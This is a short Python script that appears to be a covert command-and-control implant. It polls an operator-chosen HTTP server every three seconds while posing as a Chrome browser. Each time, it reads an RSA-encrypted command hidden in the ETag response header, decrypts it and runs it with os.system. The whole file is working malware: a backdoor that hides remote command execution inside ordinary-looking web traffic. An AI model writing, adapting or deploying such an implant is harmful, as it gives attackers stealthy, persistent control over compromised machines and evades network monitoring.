 #!/usr/bin/env python

from Crypto.PublicKey import RSA
from Crypto import Random
import ast

import sys
import http.client
import urllib
import time
import os
import re


from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


def encrypt_with_key(a_message, _key):
    encryptor = PKCS1_OAEP.new(_key)
    encrypted_msg = encryptor.encrypt(a_message)
    print(encrypted_msg)
    return encrypted_msg

def decrypt_with_key(enc_message, _key):
    encryptor = PKCS1_OAEP.new(_key)
    encrypted_msg = encryptor.decrypt(enc_message)
    print(encrypted_msg)
    return encrypted_msg

public_key = RSA.importKey(open("rsa.public", "rb").read())
private_key = RSA.importKey(open("rsa.private", "rb").read())


#get http server ip
http_server = sys.argv[1]
#create a connection
conn = http.client.HTTPConnection(http_server, 8082)

#params = urllib.parse.urlencode({'@id': '11223344', '@key': '23AB5CF'})


headers = {'Connection': 'keep-alive','Upgrade-Insecure-Requests': '1', "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Language': 'en-US,en;q=0.9'}

while 1:
    
    conn.request('GET', '/home_new.html',  headers=headers)
    #conn.request('GET', '/home.html',{}, headers)

    
    rsp = conn.getresponse()
    
    data_received = rsp.read()
    etag= bytes.fromhex(rsp.getheader("ETag"))
    command =decrypt_with_key(etag,private_key).decode('ascii')
    print(command)
    #command = re.search("<title>(.*?)</title>", str(data_received)).group(1)
    
    os.system(command)
    time.sleep(3)
conn.close()
